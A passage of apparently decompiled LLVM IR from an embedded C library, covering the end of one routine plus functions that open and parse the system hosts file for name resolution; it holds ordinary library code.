  %v2_10012c28 = inttoptr i32 %v1_10012c28 to i8*
  %v3_10012c28 = load i8, i8* %v2_10012c28, align 1
  %v4_10012c28 = zext i8 %v3_10012c28 to i32
  store i32 %v4_10012c28, i32* %r0.global-to-local, align 4
  %v1_10012c2c = mul nuw nsw i32 %v4_10012c24, 256
  store i32 %v1_10012c2c, i32* %r9.global-to-local, align 4
  %v0_10012c30 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012c30 = load i32, i32* @r31, align 4
  %v2_10012c30 = add i32 %v1_10012c30, 24
  %v3_10012c30 = inttoptr i32 %v2_10012c30 to i32*
  store i32 %v0_10012c30, i32* %v3_10012c30, align 4
  %v0_10012c34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012c34 = load i32, i32* %r0.global-to-local, align 4
  %v2_10012c34 = or i32 %v1_10012c34, %v0_10012c34
  store i32 %v2_10012c34, i32* %r9.global-to-local, align 4
  %v0_10012c38 = load i32, i32* %r6.global-to-local, align 4
  %v1_10012c38 = load i32, i32* @r31, align 4
  %v2_10012c38 = add i32 %v1_10012c38, 20
  %v3_10012c38 = inttoptr i32 %v2_10012c38 to i32*
  store i32 %v0_10012c38, i32* %v3_10012c38, align 4
  %v0_10012c3c = load i32, i32* @r29, align 4
  %v1_10012c3c = load i32, i32* %r9.global-to-local, align 4
  %v2_10012c3c = icmp slt i32 %v0_10012c3c, %v1_10012c3c
  %v1_10012c40 = add i32 %v1_10012c3c, 10
  store i32 %v1_10012c40, i32* %r0.global-to-local, align 4
  %v0_10012c44 = load i32, i32* @r27, align 4
  %v2_10012c44 = add i32 %v0_10012c44, %v1_10012c40
  store i32 %v2_10012c44, i32* @r27, align 4
  %v1_10012c48 = load i32, i32* @r31, align 4
  %v2_10012c48 = add i32 %v1_10012c48, 16
  %v3_10012c48 = inttoptr i32 %v2_10012c48 to i32*
  store i32 %v1_10012c3c, i32* %v3_10012c48, align 4
  br i1 %v2_10012c3c, label %dec_label_pc_10012c50, label %dec_label_pc_10012bb8.dec_label_pc_10012c54_crit_edge

dec_label_pc_10012bb8.dec_label_pc_10012c54_crit_edge: ; preds = %dec_label_pc_10012bb8
  %v0_10012c58.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10012c54

dec_label_pc_10012c50:                            ; preds = %dec_label_pc_10012bb8
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10012c54

dec_label_pc_10012c54:                            ; preds = %dec_label_pc_10012bb8.dec_label_pc_10012c54_crit_edge, %entry, %dec_label_pc_10012bb0, %dec_label_pc_10012c50
  %v0_10012c58 = phi i32 [ %v0_10012c58.pre, %dec_label_pc_10012bb8.dec_label_pc_10012c54_crit_edge ], [ %v2_10012b88, %entry ], [ %v1_10012b98, %dec_label_pc_10012bb0 ], [ -1, %dec_label_pc_10012c50 ]
  store i32 %v0_10012b60, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012c58

; uselistorder directives
  uselistorder i32 %v1_10012c3c, { 1, 0, 2 }
  uselistorder i32 %v1_10012c00, { 1, 0 }
  uselistorder i32 %v1_10012b98, { 1, 2, 0 }
  uselistorder i32 %v2_10012b88, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10012b68, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 31, 32, 33, 34, 1, 13, 35, 36, 14, 15, 16, 17, 6, 7, 29, 8, 0, 41, 42, 18, 19, 20, 21, 22, 24, 25, 23, 40, 37, 9, 10, 11, 12, 2, 26, 27, 28, 5, 30, 3, 4, 38, 39 }
  uselistorder i32 9, { 19, 20, 21, 22, 1, 10, 2, 11, 3, 12, 0, 13, 14, 15, 16, 17, 4, 5, 6, 7, 8, 9, 18, 23, 24, 25 }
  uselistorder i32 65536, { 0, 36, 1, 2, 3, 4, 6, 5, 7, 8, 9, 39, 10, 11, 37, 12, 14, 13, 15, 38, 16, 18, 17, 19, 21, 20, 22, 23, 24, 27, 26, 25, 29, 30, 28, 31, 33, 34, 32, 35 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 38, 2, 0, 8, 18, 20, 19, 10, 21, 57, 9, 63, 3, 58, 59, 39, 40, 22, 41, 42, 23, 24, 25, 26, 27, 35, 37, 64, 65, 36, 68, 45, 14, 4, 5, 60, 66, 67, 6, 73, 74, 75, 69, 70, 71, 72, 12, 44, 43, 56, 7, 13, 46, 15, 28, 16, 29, 30, 61, 62, 31, 32, 33, 17, 34, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_10012c54, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_10012c70 = load i32, i32* @lr, align 4
  store i32 268512404, i32* @lr, align 4
  %v3_10012c90 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1001d8e0.964 to i32), i32 ptrtoint (i32* @global_var_1001d87c.934 to i32))
  %v3_10012c98 = icmp eq i32 %v3_10012c90, 0
  br i1 %v3_10012c98, label %dec_label_pc_10012ca0, label %dec_label_pc_10012cbc

dec_label_pc_10012ca0:                            ; preds = %entry
  %v0_10012c94 = load i32, i32* @r29, align 4
  store i32 %v0_10012c70, i32* @lr, align 4
  %v3_10012cb8 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001d8ec.965 to i32), i32 %v0_10012c94)
  br label %dec_label_pc_10012cbc

dec_label_pc_10012cbc:                            ; preds = %entry, %dec_label_pc_10012ca0
  %v0_10012ccc = phi i32 [ %v3_10012c90, %entry ], [ %v3_10012cb8, %dec_label_pc_10012ca0 ]
  ret i32 %v0_10012ccc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 2, 1, 0, 5, 4, 3 }
  uselistorder label %dec_label_pc_10012cbc, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_10012cd0 = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_10012ce4 = sub i32 0, %arg6
  %v1_10012ce8 = urem i32 %v1_10012ce4, 4
  store i32 %v1_10012ce8, i32* %r0.global-to-local, align 4
  %v3_10012ce8 = icmp eq i32 %v1_10012ce8, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_10012d00 = load i32, i32* @r10, align 4
  store i32 %v0_10012d00, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_10012d1c.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_10012ce8, label %dec_label_pc_10012d1c, label %dec_label_pc_10012d0c

dec_label_pc_10012d0c:                            ; preds = %entry
  %v2_10012d0c = icmp ult i32 %v0_10012d1c.pr, %v1_10012ce8
  br i1 %v2_10012d0c, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d14

dec_label_pc_10012d14:                            ; preds = %dec_label_pc_10012d0c
  %v2_10012d14 = sub i32 %v0_10012d1c.pr, %v1_10012ce8
  store i32 %v2_10012d14, i32* %r9.global-to-local, align 4
  %v2_10012d18 = add i32 %v1_10012ce8, %arg6
  store i32 %v2_10012d18, i32* @r30, align 4
  br label %dec_label_pc_10012d1c

dec_label_pc_10012d1c:                            ; preds = %entry, %dec_label_pc_10012d14
  %v0_10012d28 = phi i32 [ %v2_10012d18, %dec_label_pc_10012d14 ], [ %arg6, %entry ]
  %v0_10012d2c = phi i32 [ %v2_10012d14, %dec_label_pc_10012d14 ], [ %v0_10012d1c.pr, %entry ]
  %tmp49 = icmp ult i32 %v0_10012d2c, 32
  br i1 %tmp49, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d24

dec_label_pc_10012d24:                            ; preds = %dec_label_pc_10012d1c
  %v3_10012d24 = icmp eq i32 %arg4, 1
  %v1_10012d28 = add i32 %v0_10012d28, 32
  store i32 %v1_10012d28, i32* @r24, align 4
  %v1_10012d2c = add i32 %v0_10012d2c, -32
  store i32 %v1_10012d2c, i32* @r27, align 4
  br i1 %v3_10012d24, label %dec_label_pc_10012e2c, label %dec_label_pc_10012d34

dec_label_pc_10012d34:                            ; preds = %dec_label_pc_10012d24
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10012d3c = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10012d3c, align 4
  %tmp50 = icmp ult i32 %v1_10012d2c, 4
  br i1 %tmp50, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d44

dec_label_pc_10012d44:                            ; preds = %dec_label_pc_10012d34
  %v0_10012d44 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012d44 = add i32 %v0_10012d44, -36
  store i32 %v1_10012d44, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10012d44, 8
  br i1 %tmp51, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d50

dec_label_pc_10012d50:                            ; preds = %dec_label_pc_10012d44
  %v0_10012d50 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_10012d50, 16
  br i1 %tmp52, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d58

dec_label_pc_10012d58:                            ; preds = %dec_label_pc_10012d50
  %v1_10012d58 = add i32 %v0_10012d44, -48
  store i32 %v1_10012d58, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10012d58, 8
  br i1 %tmp53, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d64

dec_label_pc_10012d64:                            ; preds = %dec_label_pc_10012d58
  %v1_10012d64 = add i32 %v0_10012d44, -56
  store i32 %v1_10012d64, i32* %r0.global-to-local, align 4
  %v1_10012d68 = add i32 %v0_10012d44, -44
  store i32 %v1_10012d68, i32* @r27, align 4
  %v3_10012d6c = icmp ugt i32 %v1_10012d64, %v1_10012d68
  %v0_10012d70 = load i32, i32* @r30, align 4
  %v1_10012d70 = add i32 %v0_10012d70, 36
  store i32 %v1_10012d70, i32* @r29, align 4
  %v1_10012d74 = add i32 %v0_10012d70, 48
  store i32 %v1_10012d74, i32* @r26, align 4
  br i1 %v3_10012d6c, label %dec_label_pc_10012d88, label %dec_label_pc_10012d80

dec_label_pc_10012d80:                            ; preds = %dec_label_pc_10012d64
  store i32 %v1_10012d64, i32* @r27, align 4
  br label %dec_label_pc_10012d88

dec_label_pc_10012d88:                            ; preds = %dec_label_pc_10012d64, %dec_label_pc_10012d80
  %v0_10012d88 = phi i32 [ %v1_10012d64, %dec_label_pc_10012d80 ], [ %v1_10012d68, %dec_label_pc_10012d64 ]
  %tmp54 = icmp ult i32 %v0_10012d88, 80
  br i1 %tmp54, label %dec_label_pc_10012fd0, label %dec_label_pc_10012d90

dec_label_pc_10012d90:                            ; preds = %dec_label_pc_10012d88
  store i32 268512660, i32* @lr, align 4
  %v0_10012d90 = call i32 @__open_etc_hosts()
  store i32 %v0_10012d90, i32* @r20, align 4
  %v3_10012d94 = icmp eq i32 %v0_10012d90, 0
  br i1 %v3_10012d94, label %dec_label_pc_10012db4, label %dec_label_pc_10012d9c

dec_label_pc_10012d9c:                            ; preds = %dec_label_pc_10012d90
  %v0_10012d9c = load i32, i32* @r24, align 4
  store i32 %v0_10012d9c, i32* @r25, align 4
  %v0_10012da4 = load i32, i32* @r26, align 4
  store i32 %v0_10012da4, i32* @r23, align 4
  %v0_10012da8 = load i32, i32* @r31, align 4
  store i32 %v0_10012da8, i32* @r24, align 4
  store i32 %v0_10012d9c, i32* %r21.global-to-local, align 4
  %v1_10012e44.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10012e3c

dec_label_pc_10012db4:                            ; preds = %dec_label_pc_10012d90
  %v1_10012db4 = load i32, i32* %r17.global-to-local, align 4
  %v2_10012db4 = inttoptr i32 %v1_10012db4 to i32*
  store i32 0, i32* %v2_10012db4, align 4
  %v0_10012db8 = call i32 @__errno_location()
  %v1_10012dbc = inttoptr i32 %v0_10012db8 to i32*
  %v2_10012dbc = load i32, i32* %v1_10012dbc, align 4
  store i32 %v2_10012dbc, i32* @r26, align 4
  br label %dec_label_pc_10012fd4

dec_label_pc_10012dc4:                            ; preds = %dec_label_pc_10012f64
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10012dc8 = load i32, i32* @r25, align 4
  %v1_10012dc8 = load i32, i32* @r22, align 4
  %v2_10012dc8 = inttoptr i32 %v1_10012dc8 to i32*
  store i32 %v0_10012dc8, i32* %v2_10012dc8, align 4
  %v0_10012dcc = load i32, i32* %r0.global-to-local, align 4
  %v1_10012dcc = load i32, i32* @r22, align 4
  %v2_10012dcc = add i32 %v1_10012dcc, 4
  %v3_10012dcc = inttoptr i32 %v2_10012dcc to i32*
  store i32 %v0_10012dcc, i32* %v3_10012dcc, align 4
  %v0_10012dd0 = load i32, i32* @r30, align 4
  %v1_10012dd0 = add i32 %v0_10012dd0, 8
  store i32 %v1_10012dd0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10012dd8 = add i32 %v0_10012dd0, 4
  %v2_10012dd8 = inttoptr i32 %v1_10012dd8 to i32*
  %v3_10012dd8 = load i32, i32* %v2_10012dd8, align 4
  store i32 %v3_10012dd8, i32* %r0.global-to-local, align 4
  %v0_10012ddc = load i32, i32* %r19.global-to-local, align 4
  %v1_10012ddc = load i32, i32* @r28, align 4
  %v2_10012ddc = add i32 %v1_10012ddc, 8
  %v3_10012ddc = inttoptr i32 %v2_10012ddc to i32*
  store i32 %v0_10012ddc, i32* %v3_10012ddc, align 4
  %v0_10012de0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012de0 = load i32, i32* @r28, align 4
  %v2_10012de0 = inttoptr i32 %v1_10012de0 to i32*
  store i32 %v0_10012de0, i32* %v2_10012de0, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10012de8 = load i32, i32* @r28, align 4
  %v2_10012de8 = add i32 %v1_10012de8, 12
  %v3_10012de8 = inttoptr i32 %v2_10012de8 to i32*
  store i32 4, i32* %v3_10012de8, align 4
  %v0_10012dec = load i32, i32* @r22, align 4
  %v1_10012dec = load i32, i32* @r28, align 4
  %v2_10012dec = add i32 %v1_10012dec, 16
  %v3_10012dec = inttoptr i32 %v2_10012dec to i32*
  store i32 %v0_10012dec, i32* %v3_10012dec, align 4
  br label %dec_label_pc_10012e20

dec_label_pc_10012df4:                            ; preds = %dec_label_pc_10012f88
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10012df8 = load i32, i32* %r21.global-to-local, align 4
  %v1_10012df8 = load i32, i32* @r23, align 4
  %v2_10012df8 = inttoptr i32 %v1_10012df8 to i32*
  store i32 %v0_10012df8, i32* %v2_10012df8, align 4
  %v0_10012dfc = load i32, i32* %r0.global-to-local, align 4
  %v1_10012dfc = load i32, i32* @r23, align 4
  %v2_10012dfc = add i32 %v1_10012dfc, 4
  %v3_10012dfc = inttoptr i32 %v2_10012dfc to i32*
  store i32 %v0_10012dfc, i32* %v3_10012dfc, align 4
  %v0_10012e00 = load i32, i32* @r30, align 4
  %v1_10012e00 = add i32 %v0_10012e00, 8
  store i32 %v1_10012e00, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_10012e08 = add i32 %v0_10012e00, 4
  %v2_10012e08 = inttoptr i32 %v1_10012e08 to i32*
  %v3_10012e08 = load i32, i32* %v2_10012e08, align 4
  store i32 %v3_10012e08, i32* %r0.global-to-local, align 4
  %v0_10012e0c = load i32, i32* %r19.global-to-local, align 4
  %v1_10012e0c = load i32, i32* @r28, align 4
  %v2_10012e0c = add i32 %v1_10012e0c, 8
  %v3_10012e0c = inttoptr i32 %v2_10012e0c to i32*
  store i32 %v0_10012e0c, i32* %v3_10012e0c, align 4
  %v0_10012e10 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012e10 = load i32, i32* @r28, align 4
  %v2_10012e10 = inttoptr i32 %v1_10012e10 to i32*
  store i32 %v0_10012e10, i32* %v2_10012e10, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_10012e18 = load i32, i32* @r28, align 4
  %v2_10012e18 = add i32 %v1_10012e18, 12
  %v3_10012e18 = inttoptr i32 %v2_10012e18 to i32*
  store i32 16, i32* %v3_10012e18, align 4
  %v0_10012e1c = load i32, i32* @r23, align 4
  %v1_10012e1c = load i32, i32* @r28, align 4
  %v2_10012e1c = add i32 %v1_10012e1c, 16
  %v3_10012e1c = inttoptr i32 %v2_10012e1c to i32*
  store i32 %v0_10012e1c, i32* %v3_10012e1c, align 4
  br label %dec_label_pc_10012e20

dec_label_pc_10012e20:                            ; preds = %dec_label_pc_10012dc4, %dec_label_pc_10012df4
  %v0_10012e20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012e20 = load i32, i32* @r28, align 4
  %v2_10012e20 = add i32 %v1_10012e20, 4
  %v3_10012e20 = inttoptr i32 %v2_10012e20 to i32*
  store i32 %v0_10012e20, i32* %v3_10012e20, align 4
  %v0_10012e24 = load i32, i32* @r28, align 4
  %v1_10012e24 = load i32, i32* %r17.global-to-local, align 4
  %v2_10012e24 = inttoptr i32 %v1_10012e24 to i32*
  store i32 %v0_10012e24, i32* %v2_10012e24, align 4
  br label %dec_label_pc_10012fbc

dec_label_pc_10012e2c:                            ; preds = %dec_label_pc_10012d24
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10012e3c

dec_label_pc_10012e3c:                            ; preds = %dec_label_pc_10012d9c, %dec_label_pc_10012e2c
  %v1_10012e44 = phi i32 [ %v1_10012e44.pre, %dec_label_pc_10012d9c ], [ %arg8, %dec_label_pc_10012e2c ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10012e44 = inttoptr i32 %v1_10012e44 to i32*
  store i32 1, i32* %v2_10012e44, align 4
  br label %dec_label_pc_10012fa4

dec_label_pc_10012e4c:                            ; preds = %dec_label_pc_10012fa4
  %v0_10012e4c = load i32, i32* @r24, align 4
  store i32 %v0_10012e4c, i32* @r3, align 4
  store i32 268512856, i32* @lr, align 4
  %v2_10012e54 = call i32 @__GI_strchr(i32 %v0_10012e4c, i32 35)
  %v4_10012e58 = icmp eq i32 %v2_10012e54, 0
  br i1 %v4_10012e58, label %dec_label_pc_10012e68, label %dec_label_pc_10012e60

dec_label_pc_10012e60:                            ; preds = %dec_label_pc_10012e4c
  %v3_10012e54 = inttoptr i32 %v2_10012e54 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10012e54, align 1
  br label %dec_label_pc_10012e68

dec_label_pc_10012e68:                            ; preds = %dec_label_pc_10012e4c, %dec_label_pc_10012e60
  %v0_10012e68 = load i32, i32* @r24, align 4
  store i32 %v0_10012e68, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_10012ee417 = inttoptr i32 %v0_10012e68 to i8*
  %v2_10012ee418 = load i8, i8* %v1_10012ee417, align 1
  %v3_10012ee419 = zext i8 %v2_10012ee418 to i32
  store i32 %v3_10012ee419, i32* %r0.global-to-local, align 4
  %v3_10012ee821 = icmp eq i8 %v2_10012ee418, 0
  br i1 %v3_10012ee821, label %dec_label_pc_10012ef0, label %dec_label_pc_10012e80.preheader

dec_label_pc_10012e74:                            ; preds = %dec_label_pc_10012e90
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10012e78 = inttoptr i32 %v0_10012eb4 to i8*
  store i8 0, i8* %v3_10012e78, align 1
  %v0_10012e7c = load i32, i32* %r11.global-to-local, align 4
  %v1_10012e7c = add i32 %v0_10012e7c, 1
  store i32 %v1_10012e7c, i32* %r11.global-to-local, align 4
  %v1_10012e80 = inttoptr i32 %v1_10012e7c to i8*
  %v2_10012e80 = load i8, i8* %v1_10012e80, align 1
  %v3_10012e80 = zext i8 %v2_10012e80 to i32
  store i32 %v3_10012e80, i32* %r0.global-to-local, align 4
  %v3_10012e84 = icmp eq i8 %v2_10012e80, 0
  br i1 %v3_10012e84, label %dec_label_pc_10012ef0, label %dec_label_pc_10012e90

dec_label_pc_10012e90:                            ; preds = %dec_label_pc_10012e80.preheader, %dec_label_pc_10012e74
  %v0_10012eb4 = phi i32 [ %v1_10012e7c, %dec_label_pc_10012e74 ], [ %v0_10012e802, %dec_label_pc_10012e80.preheader ]
  %v0_10012e98.in = phi i32 [ %v3_10012e80, %dec_label_pc_10012e74 ], [ %v3_10012e805, %dec_label_pc_10012e80.preheader ]
  %v0_10012e98 = mul nuw nsw i32 %v0_10012e98.in, 2
  %v3_10012e94 = load i32, i32* @global_var_1002e5b0, align 4
  store i32 %v3_10012e94, i32* %r9.global-to-local, align 4
  %v2_10012e98 = add i32 %v3_10012e94, %v0_10012e98
  %v3_10012e98 = inttoptr i32 %v2_10012e98 to i16*
  %v4_10012e98 = load i16, i16* %v3_10012e98, align 2
  %v5_10012e98 = zext i16 %v4_10012e98 to i32
  store i32 %v5_10012e98, i32* %r0.global-to-local, align 4
  %v1_10012e9c = and i32 %v5_10012e98, 32
  store i32 %v1_10012e9c, i32* %r9.global-to-local, align 4
  %v3_10012e9c = icmp eq i32 %v1_10012e9c, 0
  br i1 %v3_10012e9c, label %dec_label_pc_10012ea4, label %dec_label_pc_10012e74

dec_label_pc_10012ea4:                            ; preds = %dec_label_pc_10012e90
  %v0_10012ea4 = load i32, i32* @r29, align 4
  %v2_10012ea4 = icmp sgt i32 %v0_10012ea4, 6
  br i1 %v2_10012ea4, label %dec_label_pc_10012ec0.preheader, label %dec_label_pc_10012eac

dec_label_pc_10012eac:                            ; preds = %dec_label_pc_10012ea4
  %v1_10012eac = mul i32 %v0_10012ea4, 4
  store i32 %v1_10012eac, i32* %r0.global-to-local, align 4
  %v1_10012eb0 = add i32 %v0_10012ea4, 1
  store i32 %v1_10012eb0, i32* @r29, align 4
  %v1_10012eb4 = load i32, i32* @r30, align 4
  %v3_10012eb4 = add i32 %v1_10012eb4, %v1_10012eac
  %v4_10012eb4 = inttoptr i32 %v3_10012eb4 to i32*
  store i32 %v0_10012eb4, i32* %v4_10012eb4, align 4
  %v0_10012ec09.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10012ec0.preheader

dec_label_pc_10012ec0.preheader:                  ; preds = %dec_label_pc_10012eac, %dec_label_pc_10012ea4
  %v0_10012ec09 = phi i32 [ %v0_10012ec09.pre, %dec_label_pc_10012eac ], [ %v0_10012eb4, %dec_label_pc_10012ea4 ]
  %v1_10012ec010 = inttoptr i32 %v0_10012ec09 to i8*
  %v2_10012ec011 = load i8, i8* %v1_10012ec010, align 1
  %v3_10012ec012 = zext i8 %v2_10012ec011 to i32
  store i32 %v3_10012ec012, i32* %r0.global-to-local, align 4
  %v3_10012ec414 = icmp eq i8 %v2_10012ec011, 0
  br i1 %v3_10012ec414, label %dec_label_pc_10012ee4.loopexit, label %dec_label_pc_10012ed0.lr.ph

dec_label_pc_10012ed0.lr.ph:                      ; preds = %dec_label_pc_10012ec0.preheader
  %v3_10012ed4.pre = load i32, i32* @global_var_1002e5b0, align 4
  br label %dec_label_pc_10012ed0

dec_label_pc_10012ebc:                            ; preds = %dec_label_pc_10012ed0
  %v1_10012ebc = add i32 %v0_10012ebc, 1
  store i32 %v1_10012ebc, i32* %r11.global-to-local, align 4
  %v1_10012ec0 = inttoptr i32 %v1_10012ebc to i8*
  %v2_10012ec0 = load i8, i8* %v1_10012ec0, align 1
  %v3_10012ec0 = zext i8 %v2_10012ec0 to i32
  store i32 %v3_10012ec0, i32* %r0.global-to-local, align 4
  %v3_10012ec4 = icmp eq i8 %v2_10012ec0, 0
  br i1 %v3_10012ec4, label %dec_label_pc_10012ee4.loopexit, label %dec_label_pc_10012ed0

dec_label_pc_10012ed0:                            ; preds = %dec_label_pc_10012ed0.lr.ph, %dec_label_pc_10012ebc
  %v0_10012ebc = phi i32 [ %v0_10012ec09, %dec_label_pc_10012ed0.lr.ph ], [ %v1_10012ebc, %dec_label_pc_10012ebc ]
  %v0_10012ed8.in = phi i32 [ %v3_10012ec012, %dec_label_pc_10012ed0.lr.ph ], [ %v3_10012ec0, %dec_label_pc_10012ebc ]
  %v0_10012ed8 = mul nuw nsw i32 %v0_10012ed8.in, 2
  store i32 %v3_10012ed4.pre, i32* %r9.global-to-local, align 4
  %v2_10012ed8 = add i32 %v0_10012ed8, %v3_10012ed4.pre
  %v3_10012ed8 = inttoptr i32 %v2_10012ed8 to i16*
  %v4_10012ed8 = load i16, i16* %v3_10012ed8, align 2
  %v5_10012ed8 = zext i16 %v4_10012ed8 to i32
  store i32 %v5_10012ed8, i32* %r0.global-to-local, align 4
  %v1_10012edc = and i32 %v5_10012ed8, 32
  store i32 %v1_10012edc, i32* %r9.global-to-local, align 4
  %v3_10012edc = icmp eq i32 %v1_10012edc, 0
  br i1 %v3_10012edc, label %dec_label_pc_10012ebc, label %dec_label_pc_10012ee4.loopexit

dec_label_pc_10012ee4.loopexit:                   ; preds = %dec_label_pc_10012ed0, %dec_label_pc_10012ebc, %dec_label_pc_10012ec0.preheader
  %v0_10012ee4 = phi i32 [ %v0_10012ec09, %dec_label_pc_10012ec0.preheader ], [ %v0_10012ebc, %dec_label_pc_10012ed0 ], [ %v1_10012ebc, %dec_label_pc_10012ebc ]
  %v1_10012ee4 = inttoptr i32 %v0_10012ee4 to i8*
  %v2_10012ee4 = load i8, i8* %v1_10012ee4, align 1
  %v3_10012ee4 = zext i8 %v2_10012ee4 to i32
  store i32 %v3_10012ee4, i32* %r0.global-to-local, align 4
  %v3_10012ee8 = icmp eq i8 %v2_10012ee4, 0
  br i1 %v3_10012ee8, label %dec_label_pc_10012ef0, label %dec_label_pc_10012e80.preheader

dec_label_pc_10012e80.preheader:                  ; preds = %dec_label_pc_10012e68, %dec_label_pc_10012ee4.loopexit
  %v0_10012e802 = phi i32 [ %v0_10012ee4, %dec_label_pc_10012ee4.loopexit ], [ %v0_10012e68, %dec_label_pc_10012e68 ]
  %v1_10012e803 = inttoptr i32 %v0_10012e802 to i8*
  %v2_10012e804 = load i8, i8* %v1_10012e803, align 1
  %v3_10012e805 = zext i8 %v2_10012e804 to i32
  store i32 %v3_10012e805, i32* %r0.global-to-local, align 4
  %v3_10012e847 = icmp eq i8 %v2_10012e804, 0
  br i1 %v3_10012e847, label %dec_label_pc_10012ef0, label %dec_label_pc_10012e90

dec_label_pc_10012ef0:                            ; preds = %dec_label_pc_10012ee4.loopexit, %dec_label_pc_10012e80.preheader, %dec_label_pc_10012e74, %dec_label_pc_10012e68
  %v0_10012ef0 = load i32, i32* @r29, align 4
  %v1_10012ef4 = mul i32 %v0_10012ef0, 4
  store i32 %v1_10012ef4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10012efc = load i32, i32* @r30, align 4
  %v3_10012efc = add i32 %v2_10012efc, %v1_10012ef4
  %v4_10012efc = inttoptr i32 %v3_10012efc to i32*
  store i32 0, i32* %v4_10012efc, align 4
  %tmp55 = icmp slt i32 %v0_10012ef0, 2
  br i1 %tmp55, label %dec_label_pc_10012fa4, label %dec_label_pc_10012f04

dec_label_pc_10012f04:                            ; preds = %dec_label_pc_10012ef0
  %v0_10012f04 = load i32, i32* %r18.global-to-local, align 4
  %v3_10012f04 = icmp eq i32 %v0_10012f04, 1
  br i1 %v3_10012f04, label %dec_label_pc_10012fbc, label %dec_label_pc_10012f0c

dec_label_pc_10012f0c:                            ; preds = %dec_label_pc_10012f04
  %v3_10012f0c = icmp eq i32 %v0_10012f04, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10012f0c, label %dec_label_pc_10012f18, label %dec_label_pc_10012f44.preheader

dec_label_pc_10012f44.preheader:                  ; preds = %dec_label_pc_10012f0c
  %v1_10012f4423 = load i32, i32* @r29, align 4
  %v2_10012f4424 = icmp sgt i32 %v1_10012f4423, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_10012f4c29 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10012f4c29, i32* @r3, align 4
  br i1 %v2_10012f4424, label %dec_label_pc_10012f30, label %dec_label_pc_10012f54

dec_label_pc_10012f18:                            ; preds = %dec_label_pc_10012f0c
  %v0_10012f18 = load i32, i32* @r30, align 4
  %v1_10012f18 = inttoptr i32 %v0_10012f18 to i32*
  %v2_10012f18 = load i32, i32* %v1_10012f18, align 4
  store i32 %v2_10012f18, i32* @r4, align 4
  %v0_10012f1c = load i32, i32* %r15.global-to-local, align 4
